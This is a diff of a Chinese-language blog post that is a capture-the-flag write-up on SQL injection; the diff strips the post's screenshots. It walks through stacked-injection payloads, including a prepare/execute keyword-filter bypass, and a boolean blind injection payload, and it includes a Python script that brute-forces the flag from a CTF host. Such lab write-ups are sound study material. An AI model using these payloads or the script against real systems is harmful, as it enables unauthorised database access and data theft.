@@ -26,27 +26,10 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="基本概念 SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。 攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。 如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image004.jpg">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image006.jpg">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image008.jpg">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image010.jpg">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image012.jpg">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image014.jpg">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image016.jpg">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image018.jpg">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image020.jpg">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image022.jpg">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image024.jpg">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image026.jpg">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image028.jpg">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image030.png">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image032.jpg">
-<meta property="og:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image034.png">
 <meta property="article:published_time" content="2025-01-24T15:29:42.000Z">
 <meta property="article:modified_time" content="2025-01-24T16:14:46.014Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image004.jpg">
   
   
   
@@ -345,53 +328,53 @@
 <h3 id="题目1-强网杯-2019-随便注"><a href="#题目1-强网杯-2019-随便注" class="headerlink" title="题目1  [强网杯 2019]随便注"></a>题目1  [强网杯 2019]随便注</h3>
 
 <p>检查是否存在sql注入，先输入1 ，1‘</p>
-<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image004.jpg" srcset="/img/loading.gif" lazyload class="" title="clip_image004">
 
-<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image006.jpg" srcset="/img/loading.gif" lazyload class="" title="clip_image006">
+
+
 
 <p>输入1回显正常，输入1’报错，基本判断存在注入，用#注释一下试试，输入1’ or 1&#x3D;1#</p>
-<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image008.jpg" srcset="/img/loading.gif" lazyload class="" title="clip_image008">
+
 
 <p>发现存在sql注入，开始注入，先输入order by</p>
-<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image010.jpg" srcset="/img/loading.gif" lazyload class="" title="clip_image010">
+
 
 <p>发现当输入到3时报错，说明有两列。尝试union select联合查询 注入</p>
-<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image012.jpg" srcset="/img/loading.gif" lazyload class="" title="clip_image012">
+
 
 <p>发现许多都被过滤掉了，尝试双写绕过，但是失败了。查了一下这里可以用堆叠注入试试，输入了1’; show databases; #</p>
-<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image014.jpg" srcset="/img/loading.gif" lazyload class="" title="clip_image014">
+
 
 <p>可以看到成功了，存在堆叠注入，然后输入1’; show tables; # 查表</p>
-<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image016.jpg" srcset="/img/loading.gif" lazyload class="" title="clip_image016">
+
 
 <p>可以看到当前库下有两张表，先爆words表，输入1’; show columns from words; #</p>
-<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image018.jpg" srcset="/img/loading.gif" lazyload class="" title="clip_image018">
+
 
 <p>可以猜测我们提交查询的窗口就是在这个表里查询数据，然后继续爆表，表名为数字时，要用反引号包起来查询。所以要输入1’; show columns from</p>
 <p><code>1919810931114514</code>;#</p>
-<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image020.jpg" srcset="/img/loading.gif" lazyload class="" title="clip_image020">
+
 
 <p>发现存在flag，而且只有一列</p>
-<p>输入1’;Set @a &#x3D; CONcat(‘sel’,’ect * from <code>1919810931114514</code>;’); PREpare flag from @a;Execute flag;# ，拿到flag<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image022.jpg" srcset="/img/loading.gif" lazyload class="" title="clip_image022"></p>
+<p>输入1’;Set @a &#x3D; CONcat(‘sel’,’ect * from <code>1919810931114514</code>;’); PREpare flag from @a;Execute flag;# ，拿到flag</p>
 <p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_69151365/article/details/136365275">https://blog.csdn.net/m0_69151365/article/details/136365275</a></p>
 <h3 id="题目2-CISCN-2019华北Day2-Web1"><a href="#题目2-CISCN-2019华北Day2-Web1" class="headerlink" title="题目2 [CISCN 2019华北Day2]Web1"></a>题目2 [CISCN 2019华北Day2]Web1</h3><p>进入题目发现同样给出了一个框，猜测是sql注入</p>
-<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image024.jpg" srcset="/img/loading.gif" lazyload class="" title="clip_image024">
+
 
 <p>先输入1 ，1‘</p>
-<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image026.jpg" srcset="/img/loading.gif" lazyload class="" title="clip_image026">
 
-<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image028.jpg" srcset="/img/loading.gif" lazyload class="" title="clip_image028">
+
+
 
 <p>发现输入1‘时，出现了bool(false)，显然是布尔盲注，题目中提示你想要的都在表’flag’中，列是’flag’ 现在，只需给出通道的ID </p>
 <p>下面要先进行fuzz测试，看看过滤了哪些字符</p>
-<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image030.png" srcset="/img/loading.gif" lazyload class="" title="clip_image030">468的都是被过滤了，selec,from,括号没有过滤，用括号绕过空格，然后构造payload：id=([select](https://so.csdn.net/so/search?q=select&spm=1001.2101.3001.7020)(ascii(substr(flag,1,1))=78)from(flag))
+468的都是被过滤了，selec,from,括号没有过滤，用括号绕过空格，然后构造payload：id=([select](https://so.csdn.net/so/search?q=select&spm=1001.2101.3001.7020)(ascii(substr(flag,1,1))=78)from(flag))
 
-<img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image032.jpg" srcset="/img/loading.gif" lazyload class="" title="clip_image032">
+
 
 <p>经过搜索，知道了下一步需要写猜解脚本</p>
 <p><strong>import requests<br> url &#x3D; “<a target="_blank" rel="noopener" href="http://node4.anna.nssctf.cn:28102/">http://node4.anna.nssctf.cn:28102/</a>“<br> payload_str &#x3D; “(select(ascii(substr(flag,{l},1))&#x3D;{n})from(flag))”<br> data&#x3D; {“id”:payload_str}<br> def getFlag():<br>   flag &#x3D; ‘’<br>   #</strong> **从第一个字符开始截取<br>   for i in range(1,100):<br>     # 枚举字符的每一种可能性<br>     for n in range(32, 126):<br>       data[“id”] &#x3D; payload_str.format(l&#x3D;i, n&#x3D;n)<br>       response &#x3D; requests.post(url&#x3D;url, data&#x3D;data)<br>       if ‘Hello’ in response.text:<br>         flag +&#x3D; chr(n)<br>         print(flag)<br>         break<br>     if flag[-1] &#x3D;&#x3D; ‘}’:<br>       break</p>
 <p> if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:<br>   getFlag()**</p>
-<p><strong><img src="/2025/01/24/sql%E6%B3%A8%E5%85%A5/clip_image034.png" srcset="/img/loading.gif" lazyload class="" title="clip_image034"></strong></p>
+<p><strong></strong></p>
 <p>得到flag</p>
 
                 
